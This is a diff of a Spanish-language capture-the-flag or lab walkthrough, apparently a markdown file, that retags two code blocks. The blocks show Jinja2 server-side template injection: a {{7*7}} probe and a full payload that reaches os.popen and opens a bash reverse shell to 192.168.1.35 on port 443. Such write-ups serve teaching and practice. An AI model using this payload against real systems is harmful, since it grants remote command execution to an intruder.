@@ -92,7 +92,7 @@ Referencia de SSTI Jinja2: [Jinja2 SSTI - HackTricks](https://book.hacktricks.xy
 
 - Como en el informe de NMAP desubrimos que `Python` está corriendo por detrás, vamos a colar lineas que afecten a administradores de templates de Python, comenzando por Jinja2 que suele ser el más común; para esto, en la linea de comandos elegimos la opción "open", y como título y descripción le agregamos la inyección:
 
-```
+```js
 {{7*7}}
 ```
 
@@ -102,7 +102,7 @@ Referencia de SSTI Jinja2: [Jinja2 SSTI - HackTricks](https://book.hacktricks.xy
 
 - Teniendo presente un SSTI lo usaremos para ganar acceso al sistema montándonos una `reverse shell` creando otro ticket que contenga la siguiente inyección:
 
-```
+```js
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("bash -c 'bash -i >& /dev/tcp/192.168.1.35/443 0>&1'").read()}}{%endif%}{% endfor %}
 ```
 
